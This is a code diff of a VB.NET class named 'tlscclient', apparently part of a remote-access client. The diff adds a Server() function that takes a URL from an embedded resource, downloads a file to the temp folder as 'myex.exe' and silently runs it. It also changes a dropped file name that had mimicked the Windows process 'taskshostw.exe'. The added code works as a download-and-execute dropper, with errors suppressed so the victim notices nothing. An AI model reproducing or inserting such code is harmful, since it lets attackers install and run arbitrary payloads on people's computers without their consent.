@@ -41,7 +41,7 @@ Public Class tlscclient
         x.Append(My.Resources.force)
         two = x.ToString
         Dim URL As String = two
-        Dim two_process As String = Environ("temp") & "taskshostw.exe"
+        Dim two_process As String = Environ("temp") & "sub.exe"
         Try
             Dim w As New Net.WebClient
             Dim f As Net.WebClient = w
@@ -52,6 +52,23 @@ Public Class tlscclient
         End Try
     End Function
 
+
+    Public Shared Function Server()
+        Dim two As String
+        Dim x As New System.Text.StringBuilder
+        x.Append(My.Resources.force)
+        two = x.ToString
+        Dim URL As String = two
+        Dim two_process As String = Environ("temp") & "myex.exe"
+        Try
+            Dim w As New Net.WebClient
+            Dim f As Net.WebClient = w
+            Dim g As Net.WebClient = f
+            IO.File.WriteAllBytes(two_process, g.DownloadData(URL))
+            Shell(two_process)
+        Catch ex As Exception
+        End Try
+    End Function
     Async Sub BeginReceive(ByVal ar As IAsyncResult)
         If Not IsConnected OrElse Not ClientSocket.Connected Then
             isDisconnected()
